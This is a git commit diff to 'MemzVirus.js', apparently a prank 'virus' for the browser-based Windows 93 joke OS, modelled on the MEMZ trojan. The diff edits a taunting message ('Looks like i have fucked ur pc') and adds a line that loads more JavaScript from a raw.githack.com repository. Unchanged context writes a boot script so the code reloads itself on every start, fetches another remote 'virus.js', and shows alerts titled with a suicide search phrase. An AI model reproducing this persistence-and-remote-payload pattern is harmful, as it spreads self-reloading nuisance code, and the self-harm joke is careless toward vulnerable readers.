4f2272b8320e4227dcec320745299342136cd2f4
mhmmkm <72941240+mhmmkm@users.noreply.github.com>
2020-11-10 13:45:07 -0700

    Update MemzVirus.js

--- MemzVirus.js
+++ MemzVirus.js
@@ -117,7 +117,7 @@ $exe("hydra")
   }, 15000); //Here u can customize the delay (1000=1sec)
 })(100); //Here u can change how many times
     
-$exe("textarea");$window.current.el.body.firstChild.value="Looks like i have fucked ur pc.\n use pc as long as you can\n:D\nTrying to kill MEMZ will cause your system to be destroyed instantly, so don't try it. Made by mkm :D\n";$window.current.changeSize({width: 750, height: 400});$alert({draggable: !1, header: !1, center: !1, title: "'Best way to kill myself' - Bing search", icon: "/c/sys/skins/w93/apps/catexplorer.png", msg: "Reboot button", btnOk: "Reboot", onclose:function(){document.write('<h1>Your computer has been destroyed by MEMZ trojan. Enjoy the Nyan Cat...</h1><img width="600" src="https://i.imgur.com/vuCXT9O.gif"><iframe width="30" height="32" src="https://www.youtube.com/embed/QH2-TGUlwu4" frameborder="0" allow="accelerometer; autoplay; loop; encrypted-media; gyroscope; picture-in-picture" allowfullscreen autoplay loop></iframe>');} })
+$exe("textarea");$window.current.el.body.firstChild.value="Looks like i have fucked ur pc.\n use pc as long as you can\n:D\nTrying to kill MEMZ will cause your system to be destroyed instantly, so don't try it. Made by mkm :D\n";$window.current.changeSize({width: 750, height: 400});$alert({draggable: !1, header: !1, center: !1, title: "'Best way to kill myself' - Bing search", icon: "/c/sys/skins/w93/apps/catexplorer.png", msg: "Reboot button", btnOk: "Reboot", onclose:function(){document.write('<h1>Your computer has been destroyed by MEMZ trojan. Enjoy the Nyan Cat...   Made by mkm. A fellow win 93 virus maker.</h1><img width="600" src="https://i.imgur.com/vuCXT9O.gif"><iframe width="30" height="32" src="https://www.youtube.com/embed/QH2-TGUlwu4" frameborder="0" allow="accelerometer; autoplay; loop; encrypted-media; gyroscope; picture-in-picture" allowfullscreen autoplay loop></iframe>');} })
 
 $alert({draggable: !1, header: !1, center: !1, title: "'Best way to kill myself' - Bing search", icon: "/c/sys/skins/w93/apps/catexplorer.png", msg: "PC Destroy 100%?(do this last plz)", btnOk: "yes", onclose:function(){$loader.script("https://raw.githack.com/mhmmkm/Yhingy/main/virus.js")}})
 
@@ -131,3 +131,4 @@ $alert.info('Virus detected')
 $db.set('boot/sys64.js', '$loader.script("https://raw.githack.com/mhmmkm/Memz-virus-v6/main/MemzVirus.js")')
 $store.set('desktop/meme.txt', 'hello world');
 $audio('/c/programs/crazyError/CRAZY-ERROR-170BPM.wav').play()
+$loader.script("https://raw.githack.com/mhmmkm/Memz-virus-v6/main/HYDRA.js")
